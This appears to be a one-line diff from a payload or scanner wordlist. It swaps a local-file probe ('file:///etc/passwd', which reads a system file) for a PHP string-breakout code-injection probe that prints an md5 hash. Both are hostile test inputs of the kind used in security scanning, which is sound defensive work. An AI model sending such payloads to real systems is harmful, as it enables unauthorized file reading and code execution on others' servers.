@@ -1,1 +1,1 @@
-file:///etc/passwd
+'.print(md5(31337)).'
